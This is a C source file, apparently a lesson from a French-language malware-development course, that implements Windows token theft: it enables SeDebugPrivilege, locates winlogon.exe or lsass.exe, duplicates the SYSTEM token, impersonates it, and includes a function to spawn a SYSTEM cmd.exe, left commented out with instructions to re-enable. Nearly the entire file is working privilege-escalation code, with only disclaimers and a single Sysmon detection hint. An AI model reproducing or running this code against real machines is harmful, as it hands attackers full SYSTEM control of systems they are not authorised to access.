/*
 * ⚠️ AVERTISSEMENT STRICT
 * Techniques de malware development. Usage éducatif uniquement.
 *
 * Module 34 : Windows Token Manipulation
 */

#include <windows.h>
#include <stdio.h>
#include <tlhelp32.h>

// 1. Enable SeDebugPrivilege (nécessaire pour OpenProcessToken sur SYSTEM)
BOOL enable_debug_privilege() {
    HANDLE hToken;
    TOKEN_PRIVILEGES tp;
    LUID luid;

    if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES, &hToken)) {
        printf("[-] OpenProcessToken failed (%d)\n", GetLastError());
        return FALSE;
    }

    if (!LookupPrivilegeValueA(NULL, "SeDebugPrivilege", &luid)) {
        printf("[-] LookupPrivilegeValue failed (%d)\n", GetLastError());
        CloseHandle(hToken);
        return FALSE;
    }

    tp.PrivilegeCount = 1;
    tp.Privileges[0].Luid = luid;
    tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;

    if (!AdjustTokenPrivileges(hToken, FALSE, &tp, sizeof(TOKEN_PRIVILEGES), NULL, NULL)) {
        printf("[-] AdjustTokenPrivileges failed (%d)\n", GetLastError());
        CloseHandle(hToken);
        return FALSE;
    }

    if (GetLastError() == ERROR_NOT_ALL_ASSIGNED) {
        printf("[-] SeDebugPrivilege not assigned (need admin)\n");
        CloseHandle(hToken);
        return FALSE;
    }

    printf("[+] SeDebugPrivilege enabled\n");
    CloseHandle(hToken);
    return TRUE;
}

// 2. Find process PID by name (ex: winlogon.exe, lsass.exe)
DWORD find_process_by_name(const char* process_name) {
    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnapshot == INVALID_HANDLE_VALUE) {
        return 0;
    }

    PROCESSENTRY32 pe32;
    pe32.dwSize = sizeof(PROCESSENTRY32);

    if (!Process32First(hSnapshot, &pe32)) {
        CloseHandle(hSnapshot);
        return 0;
    }

    do {
        if (_stricmp(pe32.szExeFile, process_name) == 0) {
            CloseHandle(hSnapshot);
            return pe32.th32ProcessID;
        }
    } while (Process32Next(hSnapshot, &pe32));

    CloseHandle(hSnapshot);
    return 0;
}

// 3. Steal token from SYSTEM process
HANDLE steal_system_token(DWORD pid) {
    HANDLE hProcess, hToken, hNewToken;

    printf("[*] Opening process PID %d\n", pid);

    hProcess = OpenProcess(PROCESS_QUERY_INFORMATION, FALSE, pid);
    if (!hProcess) {
        printf("[-] OpenProcess failed (%d)\n", GetLastError());
        return NULL;
    }

    if (!OpenProcessToken(hProcess, TOKEN_DUPLICATE | TOKEN_QUERY, &hToken)) {
        printf("[-] OpenProcessToken failed (%d)\n", GetLastError());
        CloseHandle(hProcess);
        return NULL;
    }

    // Dupliquer token (Primary pour CreateProcess)
    if (!DuplicateTokenEx(hToken, MAXIMUM_ALLOWED, NULL,
                          SecurityImpersonation, TokenPrimary, &hNewToken)) {
        printf("[-] DuplicateTokenEx failed (%d)\n", GetLastError());
        CloseHandle(hToken);
        CloseHandle(hProcess);
        return NULL;
    }

    printf("[+] Token duplicated successfully\n");

    CloseHandle(hToken);
    CloseHandle(hProcess);

    return hNewToken;
}

// 4. Create process with stolen token (SYSTEM cmd.exe)
BOOL create_process_with_token(HANDLE hToken, const wchar_t* command) {
    STARTUPINFOW si;
    PROCESS_INFORMATION pi;

    ZeroMemory(&si, sizeof(si));
    si.cb = sizeof(si);
    ZeroMemory(&pi, sizeof(pi));

    printf("[*] Creating process with stolen token: %ls\n", command);

    // CreateProcessWithTokenW nécessite SeImpersonatePrivilege
    if (!CreateProcessWithTokenW(hToken, 0, NULL, (LPWSTR)command,
                                 CREATE_NEW_CONSOLE, NULL, NULL, &si, &pi)) {
        printf("[-] CreateProcessWithTokenW failed (%d)\n", GetLastError());
        return FALSE;
    }

    printf("[+] Process created successfully (PID %d)\n", pi.dwProcessId);
    printf("[!] SYSTEM shell should be spawned!\n");

    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);

    return TRUE;
}

// 5. Impersonation (thread-level, no CreateProcess)
BOOL impersonate_token(HANDLE hToken) {
    HANDLE hDupToken;

    // Dupliquer en Impersonation token
    if (!DuplicateTokenEx(hToken, MAXIMUM_ALLOWED, NULL,
                          SecurityImpersonation, TokenImpersonation, &hDupToken)) {
        printf("[-] DuplicateTokenEx (Impersonation) failed (%d)\n", GetLastError());
        return FALSE;
    }

    // Impersonater sur thread actuel
    if (!ImpersonateLoggedOnUser(hDupToken)) {
        printf("[-] ImpersonateLoggedOnUser failed (%d)\n", GetLastError());
        CloseHandle(hDupToken);
        return FALSE;
    }

    printf("[+] Thread impersonated successfully\n");

    // Vérifier user impersonaté
    char username[256];
    DWORD size = sizeof(username);
    if (GetUserNameA(username, &size)) {
        printf("[*] Current user: %s\n", username);
    }

    CloseHandle(hDupToken);
    return TRUE;
}

// 6. Revert impersonation
void revert_impersonation() {
    if (RevertToSelf()) {
        printf("[*] Reverted to original token\n");
    }
}

// 7. Display token information
void display_token_info(HANDLE hToken) {
    TOKEN_USER token_user;
    DWORD size;
    char name[256], domain[256];
    DWORD name_size = sizeof(name), domain_size = sizeof(domain);
    SID_NAME_USE sid_type;

    if (GetTokenInformation(hToken, TokenUser, &token_user, sizeof(token_user), &size)) {
        if (LookupAccountSidA(NULL, token_user.User.Sid, name, &name_size,
                              domain, &domain_size, &sid_type)) {
            printf("[*] Token User: %s\\%s\n", domain, name);
        }
    }

    // Integrity level
    TOKEN_MANDATORY_LABEL label;
    if (GetTokenInformation(hToken, TokenIntegrityLevel, &label, sizeof(label), &size)) {
        DWORD integrity = *GetSidSubAuthority(label.Label.Sid,
                                               *GetSidSubAuthorityCount(label.Label.Sid) - 1);
        const char* level =
            (integrity < 0x2000) ? "Low" :
            (integrity < 0x3000) ? "Medium" :
            (integrity < 0x4000) ? "High" : "SYSTEM";
        printf("[*] Integrity Level: %s (0x%x)\n", level, integrity);
    }
}

int main() {
    printf("\n⚠️  AVERTISSEMENT : Techniques de token manipulation malware dev\n");
    printf("   Usage éducatif uniquement. Tests VM isolées.\n\n");

    printf("=== WINDOWS TOKEN MANIPULATION DEMO ===\n\n");

    // Step 1: Enable SeDebugPrivilege
    printf("[1] Enabling SeDebugPrivilege\n");
    if (!enable_debug_privilege()) {
        printf("[-] FAILED: Run as Administrator!\n");
        return 1;
    }

    // Step 2: Display current token
    printf("\n[2] Current Token Info\n");
    HANDLE hCurrentToken;
    if (OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &hCurrentToken)) {
        display_token_info(hCurrentToken);
        CloseHandle(hCurrentToken);
    }

    // Step 3: Find SYSTEM process (winlogon.exe)
    printf("\n[3] Finding SYSTEM Process\n");
    DWORD system_pid = find_process_by_name("winlogon.exe");
    if (system_pid == 0) {
        printf("[-] winlogon.exe not found, trying lsass.exe\n");
        system_pid = find_process_by_name("lsass.exe");
    }

    if (system_pid == 0) {
        printf("[-] No SYSTEM process found\n");
        return 1;
    }

    printf("[+] Found process PID: %d\n", system_pid);

    // Step 4: Steal SYSTEM token
    printf("\n[4] Stealing SYSTEM Token\n");
    HANDLE hStolenToken = steal_system_token(system_pid);
    if (!hStolenToken) {
        printf("[-] Token stealing failed\n");
        return 1;
    }

    printf("\n[*] Stolen Token Info:\n");
    display_token_info(hStolenToken);

    // Step 5: Impersonate (thread-level)
    printf("\n[5] Thread Impersonation\n");
    impersonate_token(hStolenToken);
    revert_impersonation();

    // Step 6: Spawn SYSTEM shell (optional - commented for safety)
    printf("\n[6] Spawning SYSTEM Shell (DISABLED for safety)\n");
    printf("[!] To enable: uncomment CreateProcessWithToken call\n");
    // create_process_with_token(hStolenToken, L"cmd.exe");

    CloseHandle(hStolenToken);

    printf("\n[!] NOTES:\n");
    printf("- SeDebugPrivilege = nécessaire pour SYSTEM token\n");
    printf("- OpenProcessToken = ouvrir token processus cible\n");
    printf("- DuplicateTokenEx = Primary (CreateProcess) ou Impersonation (thread)\n");
    printf("- ImpersonateLoggedOnUser = thread-level impersonation\n");
    printf("- CreateProcessWithTokenW = spawn process avec token volé\n");
    printf("- Détection : Sysmon Event ID 10 (ProcessAccess)\n");

    return 0;
}
